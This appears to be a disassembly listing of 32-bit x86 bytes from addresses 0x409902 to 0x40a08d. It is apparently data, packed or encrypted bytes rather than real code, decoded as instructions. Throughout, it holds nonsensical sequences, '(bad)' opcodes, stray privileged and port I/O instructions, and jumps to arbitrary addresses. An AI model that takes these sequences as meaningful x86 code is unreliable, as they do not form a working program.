  409902:	xor    BYTE PTR [ecx+esi*4],cl
  409905:	sbb    al,0xc1
  409907:	outs   dx,BYTE PTR ds:[esi]
  409908:	xchg   esp,eax
  409909:	or     DWORD PTR [eax+ecx*2-0x49],esi
  40990d:	icebp  
  40990e:	and    BYTE PTR [ebx-0x46],ch
  409911:	or     esp,DWORD PTR [ebp+0xc]
  409914:	shl    BYTE PTR [edx-0x587abd0],cl
  40991a:	in     eax,0x80
  40991c:	sub    DWORD PTR [ebp-0x2b8f5c5d],esi
  409922:	dec    eax
  409923:	rol    DWORD PTR [eax],0xbe
  409926:	repnz cdq 
  409928:	fst    QWORD PTR [ecx+0x573acbba]
  40992e:	lods   al,BYTE PTR ds:[esi]
  40992f:	xchg   ecx,eax
  409930:	fnstsw WORD PTR [eax+0x4c94200e]
  409936:	cdq    
  409937:	mov    BYTE PTR [ecx+0x363b81f3],dl
  40993d:	push   0x27c86634
  409942:	mov    ecx,0xee853a84
  409947:	mov    BYTE PTR [edx-0x42e358ec],dl
  40994d:	clc    
  40994e:	pop    esi
  40994f:	xchg   ecx,eax
  409950:	push   esp
  409951:	adc    BYTE PTR [ebp+0x1b5afc22],ch
  409957:	(bad)  
  409958:	fimul  DWORD PTR [edx]
  40995a:	jnp    0x409980
  40995c:	outs   dx,BYTE PTR ds:[esi]
  40995d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40995e:	stos   BYTE PTR es:[edi],al
  40995f:	pop    ds
  409960:	out    dx,al
  409961:	xchg   edi,eax
  409962:	sub    BYTE PTR ds:0x2695933b,bh
  409968:	(bad)  
  409969:	out    dx,eax
  40996a:	dec    ecx
  40996b:	cmc    
  40996c:	inc    ebx
  40996d:	adc    esi,DWORD PTR [eax]
  40996f:	aaa    
  409970:	push   ebp
  409971:	mov    BYTE PTR [edx],ah
  409973:	cmp    eax,0xc75bd339
  409978:	fwait
  409979:	je     0x4099ec
  40997b:	push   esp
  40997c:	rcl    BYTE PTR [esi+0x722f70da],1
  409982:	xor    DWORD PTR ds:0x18cb8228,esi
  409988:	jle    0x409933
  40998a:	adc    bh,BYTE PTR ds:0xfa492a31
  409990:	sar    ebp,1
  409992:	dec    ecx
  409993:	xor    esp,DWORD PTR [ebp+0x34]
  409996:	ins    DWORD PTR es:[edi],dx
  409997:	xchg   esp,eax
  409998:	or     bh,cl
  40999a:	mov    esp,0x1179b8a0
  40999f:	mov    WORD PTR [eax],?
  4099a1:	xchg   BYTE PTR [ebp-0x2e5ae3f5],bl
  4099a7:	push   eax
  4099a8:	push   edi
  4099a9:	ja     0x409a28
  4099ab:	test   al,0xa
  4099ad:	mov    ds:0x7e9f34a1,eax
  4099b2:	cmp    eax,0x604fac4a
  4099b7:	inc    edi
  4099b8:	jmp    0x279762a1
  4099bd:	xchg   ecx,eax
  4099be:	push   edi
  4099bf:	fistp  DWORD PTR cs:[edi+0x45]
  4099c3:	in     al,0x8b
  4099c5:	arpl   WORD PTR [esi+0x52],di
  4099c8:	push   ss
  4099c9:	xchg   ecx,eax
  4099ca:	and    al,BYTE PTR [ebp+0x43]
  4099cd:	mov    ebx,0x8795bb7b
  4099d2:	push   ebp
  4099d3:	mov    eax,0xe1ee87bc
  4099d8:	scas   al,BYTE PTR es:[edi]
  4099d9:	pop    esp
  4099da:	mov    bl,0x6c
  4099dc:	arpl   WORD PTR [ebx-0x1a150d41],dx
  4099e2:	xlat   BYTE PTR ds:[ebx]
  4099e3:	cmp    al,0xa2
  4099e5:	jp     0x409998
  4099e7:	xchg   ecx,eax
  4099e8:	xchg   edx,eax
  4099e9:	mov    bh,0xc7
  4099eb:	push   0xffffffe6
  4099ed:	scas   al,BYTE PTR es:[edi]
  4099ee:	popa   
  4099ef:	jmp    0x4099ae
  4099f1:	mov    WORD PTR [edi-0x55],fs
  4099f4:	sbb    eax,0xd83f46bf
  4099f9:	inc    ebp
  4099fa:	and    al,0x13
  4099fc:	in     al,dx
  4099fd:	add    al,0x8c
  4099ff:	outs   dx,BYTE PTR cs:[esi]
  409a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a02:	les    esp,FWORD PTR [ebx-0x81c7df0]
  409a08:	idiv   esp
  409a0a:	scas   eax,DWORD PTR es:[edi]
  409a0b:	cdq    
  409a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a0d:	test   DWORD PTR [ecx+0xcf8a23c],edx
  409a13:	jmp    0xd568:0xc571df33
  409a1a:	into   
  409a1b:	ins    DWORD PTR es:[edi],dx
  409a1c:	and    ch,cl
  409a1e:	lahf   
  409a1f:	and    ah,BYTE PTR [ecx+0x5cc36e80]
  409a25:	mov    bl,0x6d
  409a27:	mov    DWORD PTR [esi+ebx*8+0x39],ebx
  409a2b:	clc    
  409a2c:	dec    edi
  409a2d:	fwait
  409a2e:	sti    
  409a2f:	inc    ebp
  409a30:	add    DWORD PTR [eax-0x2e],esi
  409a33:	jne    0x409a8a
  409a35:	cmp    bh,0x3d
  409a38:	jge    0x409a22
  409a3a:	aam    0x90
  409a3c:	or     BYTE PTR [esi-0x2c],0xb3
  409a40:	hlt    
  409a41:	das    
  409a42:	inc    ebp
  409a43:	in     al,0xd
  409a45:	inc    ecx
  409a46:	popa   
  409a47:	inc    ecx
  409a48:	stos   DWORD PTR es:[edi],eax
  409a49:	xor    al,0x62
  409a4b:	call   0x24fb:0x414d0ef1
  409a52:	or     al,0x95
  409a54:	data16 sbb ch,BYTE PTR gs:[edi]
  409a58:	push   es
  409a59:	es into 
  409a5b:	(bad)
  409a5f:	xor    eax,0x24072757
  409a64:	xor    ah,BYTE PTR [ecx-0xe825df3]
  409a6a:	jmp    0x409a66
  409a6c:	xlat   BYTE PTR ds:[ebx]
  409a6d:	sub    al,0xd9
  409a70:	jae    0x409a11
  409a72:	lock enter 0x4510,0x7e
  409a77:	push   ds
  409a78:	jb     0x409a1e
  409a7a:	aad    0xc1
  409a7c:	gs inc esp
  409a7e:	sbb    eax,0xe9940b0b
  409a83:	dec    ch
  409a85:	les    ebp,FWORD PTR [ebx]
  409a87:	lds    ebp,FWORD PTR [ebp+0x1]
  409a8a:	pop    ss
  409a8b:	add    bl,ah
  409a8d:	pop    es
  409a8e:	mov    eax,0xed0b0809
  409a93:	dec    eax
  409a94:	retf   
  409a95:	xor    BYTE PTR [edx-0x218c4b7f],al
  409a9b:	sbb    ch,BYTE PTR [eax]
  409a9d:	adc    al,0x1c
  409a9f:	pushf  
  409aa0:	arpl   WORD PTR [ebx+0x6c7c6754],si
  409aa6:	das    
  409aa7:	sub    bl,BYTE PTR [eax-0x4f]
  409aaa:	adc    eax,0x90496108
  409aaf:	pop    ecx
  409ab0:	fadd   DWORD PTR [ebx]
  409ab2:	sbb    cl,BYTE PTR [edx+0xd63d5c6]
  409ab8:	(bad)  
  409ab9:	sub    esi,edi
  409abb:	in     al,dx
  409abc:	lods   eax,DWORD PTR ds:[esi]
  409abd:	xor    eax,0xe1237cfe
  409ac2:	sahf   
  409ac3:	inc    esp
  409ac4:	cli    
  409ac5:	sbb    DWORD PTR [ebx+0x6f],ebx
  409ac8:	int    0xf9
  409aca:	push   cs
  409acb:	xor    esi,DWORD PTR [edi-0x3f6cd811]
  409ad1:	sub    eax,0xbd99e81e
  409ad6:	mov    bl,0x81
  409ad8:	dec    esp
  409ad9:	jge    0x409b4c
  409adb:	mov    ebp,0x54652859
  409ae0:	push   ds
  409ae1:	mov    ds:0xf01198a4,eax
  409ae6:	inc    ebp
  409ae7:	dec    edx
  409ae8:	sub    al,dl
  409aea:	mov    edi,0x3318a06e
  409aef:	(bad)  
  409af0:	mov    eax,ds:0xde1871d4
  409af5:	cmp    eax,0xff74edce
  409afa:	jno    0x409a8a
  409afc:	shl    BYTE PTR [ebp-0x46],0xa2
  409b00:	cmp    esp,DWORD PTR [ebp+edx*8-0x34]
  409b04:	sti    
  409b05:	mov    WORD PTR [eax+ebx*8],?
  409b08:	jl     0x409a95
  409b0a:	dec    ebp
  409b0b:	call   0x249a:0xd9163622
  409b12:	or     eax,0x97abfe46
  409b17:	jb     0x409aff
  409b19:	and    al,BYTE PTR [ebp-0x3a]
  409b1c:	xchg   BYTE PTR [ebx-0x1d2681b4],cl
  409b22:	push   0xffffff98
  409b24:	push   ebx
  409b25:	push   0xc04239f5
  409b2a:	or     BYTE PTR [ebx+0x713af8e8],dh
  409b30:	int3   
  409b31:	mov    al,ds:0x1c5f363a
  409b36:	leave  
  409b37:	les    esp,FWORD PTR [ebx+0x2d]
  409b3a:	or     edi,DWORD PTR [esi+0x10e40da4]
  409b40:	inc    ebp
  409b41:	jl     0x409b79
  409b43:	fs enter 0xcb36,0x97
  409b48:	push   ds
  409b49:	stos   BYTE PTR es:[edi],al
  409b4a:	adc    al,0x85
  409b4c:	adc    DWORD PTR [ecx+ebp*1-0x68],esp
  409b50:	jmp    0x409b74
  409b52:	in     al,0x9
  409b54:	push   ss
  409b55:	ds dec edi
  409b57:	cmp    dl,BYTE PTR [edi-0x57]
  409b5a:	and    eax,0x4fc1f074
  409b5f:	xchg   esi,eax
  409b60:	jg     0x409b17
  409b62:	push   ebp
  409b63:	iret   
  409b64:	pop    esi
  409b65:	xor    bl,dh
  409b67:	dec    esi
  409b68:	mov    al,0x5e
  409b6a:	jg     0x409b66
  409b6c:	iret   
  409b6d:	mov    cl,BYTE PTR [esp+eax*1]
  409b70:	aaa    
  409b71:	into   
  409b72:	ins    BYTE PTR es:[edi],dx
  409b73:	lds    ecx,FWORD PTR [ebx-0x6b]
  409b76:	jns    0x409b38
  409b78:	loopne 0x409b00
  409b7a:	js     0x409b34
  409b7c:	mov    dl,0xd1
  409b7e:	pop    ebp
  409b7f:	inc    esp
  409b80:	dec    ebx
  409b81:	mov    al,ds:0x11527cc5
  409b86:	mov    al,0xec
  409b88:	outs   dx,BYTE PTR ds:[esi]
  409b89:	je     0x409b8e
  409b8b:	ins    BYTE PTR es:[edi],dx
  409b8c:	mov    eax,0x69cd9c64
  409b91:	out    0x32,eax
  409b93:	sbb    ebx,DWORD PTR [edi-0x27]
  409b96:	out    dx,al
  409b97:	xchg   edx,eax
  409b98:	xor    dh,dl
  409b9a:	sbb    eax,0xdd15f639
  409b9f:	adc    bh,al
  409ba1:	sbb    BYTE PTR [esi+eax*1],0xa9
  409ba5:	add    BYTE PTR [ebx-0x15],ah
  409ba8:	jmp    0x409bc9
  409baa:	cmp    al,0x2
  409bac:	test   al,0x6
  409bae:	cdq    
  409baf:	cli    
  409bb0:	xlat   BYTE PTR ds:[ebx]
  409bb1:	popf   
  409bb2:	mov    ebx,DWORD PTR [ebx]
  409bb4:	lds    edx,FWORD PTR cs:[edi+0x45]
  409bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bb9:	repnz xor al,0x2e
  409bbc:	mov    dl,bl
  409bbe:	idiv   dl
  409bc0:	addr16 lock addr16 in al,0x10
  409bc5:	adc    BYTE PTR [ebp+0x7c],bh
  409bc8:	mov    bh,0x2e
  409bca:	push   esp
  409bcb:	xor    DWORD PTR ds:0xfedda26f,esi
  409bd1:	xor    al,BYTE PTR [eax-0xf]
  409bd4:	push   0x9804034b
  409bd9:	xchg   ebp,eax
  409bda:	adc    eax,DWORD PTR ds:[edi-0x35e1a8d2]
  409be1:	mov    esp,ebx
  409be3:	neg    DWORD PTR [ebp+0x61965905]
  409be9:	jmp    0x409be8
  409beb:	sub    BYTE PTR [esi+0x66],dl
  409bee:	inc    esp
  409bef:	lahf   
  409bf0:	xchg   edx,eax
  409bf1:	sub    DWORD PTR [ebp-0x54],0xffffffa1
  409bf5:	pop    esp
  409bf6:	mov    edx,0xfe3f95c1
  409bfb:	add    al,0x81
  409bfd:	data16 xchg BYTE PTR [ebx+0x6d23ffc3],bl
  409c04:	mov    esp,0xfaf11bf4
  409c09:	rcr    ebx,1
  409c0b:	int3   
  409c0c:	add    BYTE PTR [eax],bh
  409c0e:	mov    esp,0xd05dce4a
  409c13:	(bad)  
  409c14:	jl     0x409be2
  409c16:	cmp    DWORD PTR [ecx-0x22da8269],esi
  409c1c:	mov    cl,0xc5
  409c1e:	test   BYTE PTR [edx],bh
  409c20:	jge    0x409bd2
  409c22:	adc    BYTE PTR [edi-0x61],al
  409c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c26:	stos   BYTE PTR es:[edi],al
  409c27:	jge    0x409c99
  409c29:	pop    es
  409c2a:	push   ss
  409c2b:	xchg   DWORD PTR [edi-0x61d42a2a],esp
  409c31:	adc    al,cl
  409c33:	push   ebp
  409c34:	shl    esp,0x42
  409c37:	jmp    0x409c63
  409c39:	add    BYTE PTR cs:[edi-0x6c5b1dbd],0xe9
  409c41:	jp     0x409c8d
  409c43:	or     ebp,DWORD PTR [ebx+0x4b168385]
  409c49:	ror    DWORD PTR [edi-0x78],0xf5
  409c4d:	xchg   esp,eax
  409c4e:	test   al,0x18
  409c50:	rcr    BYTE PTR [edi-0x56e96de2],0x29
  409c57:	pop    es
  409c58:	cmp    al,0xa9
  409c5a:	dec    ebx
  409c5b:	xchg   DWORD PTR [esi+0x58b07afe],eax
  409c61:	aaa    
  409c62:	or     al,0x5f
  409c64:	jp     0x409c0f
  409c66:	cmp    edi,ecx
  409c68:	dec    ebx
  409c69:	stos   WORD PTR es:[edi],ax
  409c6b:	loope  0x409cd9
  409c6d:	and    al,0x79
  409c6f:	ins    DWORD PTR es:[edi],dx
  409c70:	popf   
  409c71:	inc    ebx
  409c72:	rep outs dx,DWORD PTR ds:[esi]
  409c74:	in     al,0xe2
  409c76:	fnstenv [esp+esi*8]
  409c79:	je     0x409c79
  409c7b:	shl    edx,1
  409c7d:	push   esp
  409c7e:	mov    ?,WORD PTR [eax]
  409c80:	pop    esp
  409c81:	mul    BYTE PTR [edx+0x2]
  409c84:	mov    ebp,0x4b63bf46
  409c89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c8a:	dec    eax
  409c8b:	dec    ebp
  409c8c:	dec    esp
  409c8d:	adc    DWORD PTR [edx],eax
  409c8f:	rcl    ebp,1
  409c91:	mov    dl,0x73
  409c93:	sub    cl,BYTE PTR [esp+esi*4-0x646e1200]
  409c9a:	cdq    
  409c9b:	in     al,dx
  409c9c:	pusha  
  409c9d:	mov    ds:0xc68f38e6,al
  409ca2:	cmp    BYTE PTR [ebp-0x66],bl
  409ca5:	mov    dh,0x65
  409ca7:	stos   DWORD PTR es:[edi],eax
  409ca8:	ret    
  409ca9:	add    dh,BYTE PTR [eax-0x1f2c937]
  409caf:	or     BYTE PTR [eax-0xb5952d9],dl
  409cb5:	xchg   ebp,eax
  409cb6:	ja     0x409c48
  409cb8:	rol    DWORD PTR [ebp+0x3f762b57],1
  409cbe:	adc    eax,0x5f73bdb3
  409cc3:	mov    eax,DWORD PTR [ecx]
  409cc5:	mov    ds:0x6d263491,al
  409cca:	ficomp DWORD PTR [ebp+0x14]
  409ccd:	imul   eax,ebp,0x40
  409cd0:	xor    eax,0x9b3d20e0
  409cd5:	mov    esp,0x730a9408
  409cda:	and    eax,0x482040b
  409cdf:	cdq    
  409ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ce1:	jp     0x409c8b
  409ce3:	ins    DWORD PTR es:[edi],dx
  409ce4:	mov    bh,0x1d
  409ce6:	shr    esp,1
  409ce8:	sub    dl,0x3a
  409ceb:	dec    ebx
  409cec:	clc    
  409ced:	and    BYTE PTR [ebp+0x42c5793e],dh
  409cf3:	sub    al,0x30
  409cf5:	mov    al,0x2f
  409cf7:	aas    
  409cf8:	inc    esp
  409cf9:	imul   ebp,ebp,0xf44a0322
  409cff:	lahf   
  409d00:	jns    0x409d18
  409d02:	fs dec edi
  409d04:	xchg   esp,eax
  409d05:	mov    ch,0xf8
  409d07:	das    
  409d08:	fbld   TBYTE PTR [ebx+0x5888673d]
  409d0e:	xchg   esi,eax
  409d0f:	outs   dx,DWORD PTR ds:[esi]
  409d10:	(bad)  
  409d11:	jge    0x409cf6
  409d13:	(bad)  
  409d14:	jnp    0x409c9b
  409d16:	call   0xbffd7954
  409d1b:	lods   eax,DWORD PTR ds:[esi]
  409d1c:	gs cmp edx,ecx
  409d1f:	mov    ah,ch
  409d21:	scas   eax,DWORD PTR es:[edi]
  409d22:	inc    esi
  409d23:	or     edi,DWORD PTR [esi-0x4e4941ee]
  409d29:	les    ecx,FWORD PTR [ecx+0x75]
  409d2c:	sub    ebp,eax
  409d2e:	xlat   BYTE PTR ds:[ebx]
  409d2f:	ins    DWORD PTR es:[edi],dx
  409d30:	dec    ecx
  409d31:	and    ecx,DWORD PTR [ecx-0x3]
  409d34:	push   ebp
  409d35:	mov    WORD PTR cs:[edi-0x42],?
  409d39:	cmp    edx,ebx
  409d3b:	xchg   edi,eax
  409d3c:	pop    ebp
  409d3d:	jne    0x409d89
  409d3f:	or     cl,dh
  409d41:	jge    0x409d9a
  409d43:	mov    dl,0xc1
  409d45:	mov    edi,0xc84382b3
  409d4a:	fnsave [edi+eiz*2-0x2e]
  409d4e:	lods   eax,DWORD PTR ds:[esi]
  409d4f:	ret    
  409d50:	pop    ecx
  409d51:	cmp    dh,0xf4
  409d54:	jmp    0x61016bc0
  409d59:	out    dx,eax
  409d5a:	test   al,0x2b
  409d5c:	outs   dx,BYTE PTR ds:[esi]
  409d5d:	pop    ebx
  409d5e:	inc    esp
  409d5f:	jle    0x409dbd
  409d61:	adc    al,0x3e
  409d63:	into   
  409d64:	mov    eax,0xe6d17ea3
  409d69:	ins    BYTE PTR es:[edi],dx
  409d6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d6b:	stos   DWORD PTR es:[edi],eax
  409d6c:	xchg   DWORD PTR [ebp+0x569a34ae],ecx
  409d72:	fnstenv [ebx-0xe360340]
  409d78:	inc    edi
  409d79:	div    DWORD PTR [ebx+0x41]
  409d7c:	mov    al,ds:0x1bf36b79
  409d81:	bound  ebp,QWORD PTR [ebp-0x51c1d1dd]
  409d87:	mov    eax,0x7bbfbd51
  409d8c:	lods   al,BYTE PTR ds:[esi]
  409d8d:	push   cs
  409d8e:	jo     0x409dd1
  409d90:	add    BYTE PTR [ebp+0x6be6ab7a],cl
  409d96:	xor    DWORD PTR [ebp+0x3a],esi
  409d99:	loope  0x409d58
  409d9b:	test   BYTE PTR [ecx+0x26],al
  409d9e:	pop    ss
  409d9f:	mov    eax,0x99a8a761
  409da4:	fistp  QWORD PTR [eax+0x5a]
  409da7:	loop   0x409de8
  409da9:	fsubr  QWORD PTR [edi+edx*4]
  409dac:	xor    eax,0x98888177
  409db1:	adc    eax,0xa25fbfa7
  409db6:	lock dec ebx
  409db8:	jg     0x409da8
  409dba:	dec    edx
  409dbb:	ins    BYTE PTR es:[edi],dx
  409dbc:	mov    ebx,0x212fa2f6
  409dc1:	icebp  
  409dc2:	xor    BYTE PTR [ebx],al
  409dc4:	stc    
  409dc5:	mov    al,ds:0xaa66e301
  409dca:	retf   
  409dcb:	mov    DWORD PTR [esi-0xa6a2bd0],0xede128c
  409dd5:	je     0x409dab
  409dd7:	mov    esi,0x78682108
  409ddc:	jb     0x409d63
  409dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ddf:	icebp  
  409de0:	fbld   TBYTE PTR [edx-0x57]
  409de3:	hlt    
  409de4:	test   ebp,esp
  409de6:	pop    ebp
  409de7:	mov    eax,ds:0xdcb431eb
  409dec:	cmp    edi,DWORD PTR gs:[ecx]
  409def:	lods   eax,DWORD PTR ds:[esi]
  409df0:	add    eax,0x515b991d
  409df5:	js     0x409e06
  409df7:	inc    esi
  409df8:	mov    al,ds:0x4b92286
  409dfd:	jnp    0x409de7
  409dff:	ins    DWORD PTR es:[edi],dx
  409e00:	(bad)  
  409e01:	cli    
  409e02:	dec    DWORD PTR [edi-0x6c]
  409e05:	xchg   edx,eax
  409e06:	js     0x409e82
  409e08:	ins    DWORD PTR es:[edi],dx
  409e09:	out    0xd2,eax
  409e0b:	or     ch,BYTE PTR [ecx-0x4a]
  409e0e:	sub    DWORD PTR [edi+0x7a],ebx
  409e11:	(bad)  
  409e12:	mov    eax,0xa64611b7
  409e17:	fdivr  QWORD PTR [esp+edx*1+0xe]
  409e1b:	push   esi
  409e1c:	int    0x35
  409e1e:	stc    
  409e1f:	adc    BYTE PTR [esp+ebx*8],al
  409e22:	cmp    DWORD PTR [ebp-0x71],esp
  409e25:	lods   al,BYTE PTR ds:[esi]
  409e26:	mov    ebp,ecx
  409e28:	mov    esp,0x4c3fdbcc
  409e2d:	mov    BYTE PTR [ebp+0x6ef1203],0x1e
  409e34:	or     bl,0xe5
  409e37:	lods   eax,DWORD PTR ds:[esi]
  409e38:	dec    ebp
  409e39:	mov    ds:0x6bd4dd79,al
  409e3e:	adc    esp,DWORD PTR [edi+0x579a11ca]
  409e44:	shr    DWORD PTR [eax-0x7f5d3f34],0xf2
  409e4b:	(bad)  
  409e4c:	fcomip st,st(5)
  409e4e:	add    esi,DWORD PTR [ebx]
  409e50:	test   eax,0xe48ec506
  409e55:	cmp    DWORD PTR [eax],ebp
  409e57:	cmc    
  409e58:	jo     0x409e47
  409e5a:	push   ds
  409e5b:	pop    edx
  409e5c:	pop    edi
  409e5d:	neg    BYTE PTR [edi-0x376d6f62]
  409e63:	daa    
  409e64:	mov    esi,es
  409e66:	pop    esi
  409e67:	jae    0x409e00
  409e69:	pop    edx
  409e6a:	aam    0xa5
  409e6c:	test   eax,0x21841874
  409e71:	and    BYTE PTR [ecx+eiz*8-0xd],dl
  409e75:	xor    eax,0x671c32e3
  409e7a:	fld    QWORD PTR [edi+0x4a]
  409e7d:	rcr    DWORD PTR [ebp-0x7a],cl
  409e80:	jecxz  0x409e46
  409e82:	sub    BYTE PTR [ecx+0x17da1572],bl
  409e88:	pop    ebp
  409e89:	dec    esp
  409e8a:	and    BYTE PTR [edi*4-0x831c2ac],al
  409e91:	inc    ebx
  409e92:	repz fdivrp st(4),st
  409e95:	pop    ecx
  409e96:	push   eax
  409e97:	or     al,0x1e
  409e99:	fwait
  409e9a:	ret    
  409e9b:	pop    ds
  409e9c:	jmp    0x6471:0x319a19ab
  409ea3:	xor    bl,dh
  409ea5:	sbb    al,0x5f
  409ea7:	mov    edi,0x5acf0a75
  409eac:	xor    DWORD PTR [edi-0x2a18aabb],0x75df2f8f
  409eb6:	retf   0xc29a
  409eb9:	in     al,dx
  409eba:	inc    ebx
  409ebb:	jp     0x409eff
  409ebd:	std    
  409ebe:	ins    BYTE PTR es:[edi],dx
  409ebf:	mov    dh,0xe3
  409ec1:	cmp    DWORD PTR [ecx],ebx
  409ec3:	jecxz  0x409e4e
  409ec5:	sub    ebp,DWORD PTR [ecx+0x46]
  409ec8:	mov    bh,0xc7
  409eca:	repz (bad) 
  409ecc:	les    ebp,FWORD PTR [esp+eiz*2+0x4731d155]
  409ed3:	(bad)  
  409ed4:	adc    esi,eax
  409ed6:	inc    eax
  409ed7:	inc    edi
  409ed8:	inc    ebx
  409ed9:	inc    eax
  409eda:	mov    eax,ds:0xe4e3630a
  409edf:	sub    esi,DWORD PTR [edx-0x3ba25f3b]
  409ee5:	mov    gs,WORD PTR [edx+ecx*2]
  409ee8:	mov    al,ds:0x3aad2151
  409eed:	cmp    dl,0x24
  409ef0:	mov    dl,0x79
  409ef2:	in     al,0x30
  409ef4:	xchg   ecx,eax
  409ef5:	dec    ebx
  409ef6:	mov    ah,0x97
  409ef8:	in     al,dx
  409ef9:	aad    0x8c
  409efb:	cmp    BYTE PTR [ecx+0x6f68138d],0x7b
  409f02:	dec    esi
  409f03:	pop    es
  409f04:	mov    dl,0x3b
  409f06:	fdiv   QWORD PTR [edx+ebx*1+0x7e827a04]
  409f0d:	or     DWORD PTR [edi+0x33ab7e35],eax
  409f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f14:	push   edx
  409f15:	int3   
  409f16:	shl    DWORD PTR [ebx],0x42
  409f19:	adc    al,0xfa
  409f1b:	wbinvd 
  409f1d:	leave  
  409f1e:	mov    eax,ds:0xd998c421
  409f23:	hlt    
  409f24:	and    al,0xcf
  409f26:	int3   
  409f27:	xchg   DWORD PTR [ebx+0x21a091a1],ebx
  409f2d:	das    
  409f2e:	addr16 fs icebp 
  409f31:	ret    
  409f32:	hlt    
  409f33:	inc    ebx
  409f34:	inc    ecx
  409f35:	cli    
  409f36:	retf   
  409f37:	sbb    al,0x87
  409f39:	xchg   edi,eax
  409f3a:	adc    ecx,DWORD PTR [edx]
  409f3c:	and    bh,BYTE PTR [esp+esi*2-0x1b]
  409f40:	cmp    al,0x27
  409f42:	inc    eax
  409f43:	pop    es
  409f44:	shl    DWORD PTR [ecx+0x5669df06],0x92
  409f4b:	cmp    eax,0xe6be8b14
  409f50:	repz aad 0xd2
  409f53:	mov    ebp,0xceede6f2
  409f58:	jmp    0x409f27
  409f5a:	push   edx
  409f5b:	int3   
  409f5c:	mov    al,ds:0x8d60bf29
  409f61:	imul   ebx,DWORD PTR [edi+0x127f76fc],0x482e090d
  409f6b:	push   edi
  409f6c:	pop    edi
  409f6d:	xlat   BYTE PTR ds:[ebx]
  409f6e:	loope  0x409f4c
  409f70:	jb     0x409f68
  409f72:	adc    esp,ecx
  409f74:	xor    bl,BYTE PTR [eax+0x6a]
  409f77:	in     eax,dx
  409f78:	icebp  
  409f79:	push   ds
  409f7a:	shl    BYTE PTR [edx-0x9],cl
  409f7d:	ds shr al,cl
  409f80:	in     eax,dx
  409f81:	retf   
  409f82:	js     0x409f19
  409f84:	neg    dl
  409f86:	hlt    
  409f87:	scas   eax,DWORD PTR es:[edi]
  409f88:	(bad)  
  409f89:	retf   
  409f8a:	mov    edi,0x53f52471
  409f8f:	jmp    0xc74a6bd7
  409f94:	test   eax,0xb3e87441
  409f99:	sbb    al,0xc2
  409f9b:	loope  0x409fa4
  409f9d:	jge    0x409f7d
  409f9f:	imul   BYTE PTR [edx+0x3c]
  409fa2:	sbb    BYTE PTR [edx+eiz*4+0x4f666737],bh
  409fa9:	and    BYTE PTR [edi-0x683b490e],cl
  409faf:	dec    edi
  409fb0:	mov    al,ds:0x13fed1c9
  409fb5:	dec    esp
  409fb6:	sub    DWORD PTR [ebp+ebp*8+0x5c52bd0c],ecx
  409fbd:	cmp    ebx,esp
  409fbf:	mov    ah,0x1d
  409fc1:	nop
  409fc2:	lahf   
  409fc3:	mov    DWORD PTR [ebx-0x64df5251],ecx
  409fc9:	inc    esp
  409fca:	cli    
  409fcb:	in     al,dx
  409fcc:	add    eax,ebp
  409fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fcf:	(bad)  
  409fd1:	test   al,0x28
  409fd3:	mov    bh,0x26
  409fd5:	sub    edi,DWORD PTR ds:0xbb53645f
  409fdb:	sub    al,BYTE PTR [ecx-0x71]
  409fde:	or     ah,BYTE PTR [edx-0x72]
  409fe1:	mov    ebx,0x26a27273
  409fe6:	mov    bh,0xae
  409fe8:	pop    ebx
  409fe9:	fs clc 
  409feb:	fistp  WORD PTR [eax]
  409fed:	pop    esi
  409fee:	mov    dh,0x6d
  409ff0:	ins    DWORD PTR es:[edi],dx
  409ff1:	xor    cl,BYTE PTR [esp+ebp*2+0x12fff23e]
  409ff8:	cmp    eax,0x1a17accb
  409ffd:	and    ah,BYTE PTR [eax]
  409fff:	pop    esp
  40a000:	push   es
  40a001:	(bad)  
  40a002:	daa    
  40a003:	pop    esi
  40a004:	retf   
  40a005:	adc    eax,0x5f97119e
  40a00a:	(bad)  
  40a00b:	push   cs
  40a00c:	ja     0x409f9d
  40a00e:	add    al,0xbf
  40a010:	dec    esp
  40a011:	add    al,0x60
  40a013:	mov    bh,0x46
  40a015:	dec    ebp
  40a016:	nop
  40a017:	push   ebp
  40a018:	fcom   QWORD PTR ds:0x1ac7ef78
  40a01e:	inc    ecx
  40a01f:	mov    eax,0xb284ae1f
  40a024:	fiadd  DWORD PTR [esi+0x4a]
  40a027:	clc    
  40a028:	ficomp WORD PTR [eax]
  40a02a:	cdq    
  40a02b:	in     al,dx
  40a02c:	pop    esp
  40a02d:	push   ds
  40a02e:	sti    
  40a02f:	cmp    BYTE PTR ds:0x9685ab76,al
  40a035:	aas    
  40a036:	mov    edx,DWORD PTR [edi-0x36e033be]
  40a03c:	lods   eax,DWORD PTR ds:[esi]
  40a03d:	push   ecx
  40a03e:	push   0x4f
  40a040:	sub    edi,0xdd1a9d38
  40a046:	pushf  
  40a047:	inc    eax
  40a048:	stos   DWORD PTR es:[edi],eax
  40a049:	push   ebx
  40a04a:	mov    ebx,0x41137dde
  40a04f:	lods   al,BYTE PTR ds:[esi]
  40a050:	xchg   esi,eax
  40a051:	jns    0x40a0b4
  40a053:	sbb    BYTE PTR [edi+0x32],dh
  40a056:	pop    ebp
  40a057:	inc    ebp
  40a058:	fwait
  40a059:	push   ebp
  40a05a:	pop    edx
  40a05b:	mov    edi,DWORD PTR fs:[edx-0x39]
  40a05f:	in     eax,dx
  40a060:	sub    BYTE PTR [ebp-0x552faa1f],cl
  40a066:	push   cs
  40a067:	shl    bh,0xfc
  40a06a:	aaa    
  40a06b:	and    eax,ebx
  40a06d:	cmp    al,0x2b
  40a06f:	pop    edi
  40a070:	xchg   edi,eax
  40a071:	stos   BYTE PTR es:[edi],al
  40a072:	pop    edx
  40a073:	(bad)  
  40a074:	dec    ebx
  40a075:	je     0x40a060
  40a077:	fisttp WORD PTR [esi+0x3cd3e76f]
  40a07d:	call   0x4df7ce99
  40a082:	cmp    BYTE PTR [ecx+0x1ff6e903],cl
  40a088:	jns    0x40a0ca
  40a08a:	xchg   ebx,eax
  40a08b:	jl     0x40a0f7
  40a08d:	sub    DWORD PTR [ebx],esp
